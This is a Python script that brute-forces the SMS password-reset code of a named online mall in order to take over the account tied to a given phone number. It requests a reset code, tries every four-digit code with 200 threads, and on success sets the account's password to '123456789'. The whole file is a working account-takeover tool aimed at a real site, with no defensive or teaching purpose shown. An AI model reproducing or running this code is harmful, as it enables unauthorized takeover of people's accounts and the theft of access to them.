#!/usr/bin/env python
# coding=utf8
# author=joeyxy83@gmail.com
# create=20150322


import json
import random
import requests
import threadpool as tp
import sys
from BeautifulSoup import BeautifulSoup 


global phone,cookie,formhash


def forgetpassword(phone):
    cookies = {'PHPSESSID':cookie}
    headers = {'content-type':'application/x-www-form-urlencoded',
               'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
               'Referer':'http://mall.dding.net/ucenter/forget',
        }
    api_url = 'http://mall.dding.net/ucenter/forget'
    try:
        req_g = requests.get(api_url,headers=headers,cookies = cookies,timeout=3)
        html = req_g.text
        soup=BeautifulSoup(html)
        formhash = soup.find('input',attrs = {'name':"formhash"})["value"]
        print "formhash:%s" % formhash
        data = {'cellphone':phone,
        'formhash':formhash,
        }
        req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
        req_status = req.status_code
        print "phone:%s sms code send" % phone[:8]
        return formhash
    except:
        req_status = 500
    #if req_status == 302:
        #print "phone:%s sms code send" % phone[:8]
        
    #elif req_status == 200:
    #    print "faild send sms code at phone:%s,cookie:%s" % (phone[:8],cookie)
    #    sys.exit(1)


def step(args):
    key = args
    password="123456789"
    data = {'valicode':key,
    'formhash':formhash,
    }
    cookies = {'PHPSESSID':cookie}
    headers = {'content-type':'application/x-www-form-urlencoded',
                    'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
                    'Referer':'http://mall.dding.net/ucenter/forget/step2',
        }
    api_url = 'http://mall.dding.net/ucenter/forget/step2'
    try:
        #req_2 = requests.get(api_url,headers=headers,cookies = cookies,timeout=3)
        req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
        req_status = req.status_code
    except:
        req_status = 500
        sys.exit(1)
    if req_status == 302:
        print "move the step3" 
        data = {'password':password,
        'repassword':password,
        'formhash':formhash,
        }
        headers = {'content-type':'application/x-www-form-urlencoded',
                    'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_4 like Mac OS X)',
                    'Referer':'http://mall.dding.net/ucenter/forget/step3',
        }
        api_url = 'http://mall.dding.net/ucenter/forget/step3'
        try:
            #req_3= requests.get(api_url,headers=headers,cookies = cookies,timeout=3)
            req = requests.post(api_url, data=data, headers=headers,cookies = cookies,timeout=3)
            req_status = req.status_code
            #location = req.headers['Location']
        except:
            req_status = 500
            sys.exit(1)
        if req_status == 302:
            print "phone done:%s,password:%s" % (phone,password)
            sys.exit(1)
        elif req_status == 200:
            burp_fail = open('./webfail_log.txt', 'a+')
            burp_fail.write('[-] Burp False phone:%s,code:%s\n'%(phone,key))
            burp_fail.close() 

def get_cookie():
    api_url = 'http://mall.dding.net/'
    try:
        req = requests.get(api_url,timeout=3)
        req_status = req.status_code
        cook = req.cookies['PHPSESSID']
    except:
        req_status = 500
        sys.exit(1)
    if req_status == 200:
        print "get cookie:%s" % cook
        return cook

if __name__ == '__main__':
    args = []
    cookie=get_cookie()
    phone = sys.argv[1]
    formhash=forgetpassword(phone)
    for i in range(1000,9999):
        #print "key:%s" % key
        args.append(i)
    pool = tp.ThreadPool(200)
    reqs = tp.makeRequests(step, args)
    [pool.putRequest(req) for req in reqs]
    pool.wait()